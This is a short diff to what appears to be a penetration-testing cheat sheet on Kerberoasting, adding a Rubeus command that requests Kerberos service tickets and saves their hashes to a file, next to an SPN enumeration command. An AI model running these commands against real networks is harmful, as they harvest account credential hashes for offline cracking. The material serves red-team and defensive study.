@@ -17,6 +17,12 @@ setspn -T domain -Q */*
 
 ## Request a TGS
 
+### Rubeus
+
+```csharp
+ .\Rubeus.exe kerberoast /outfile:hashes.txt
+```
+
 ### Powershell
 
 ```csharp
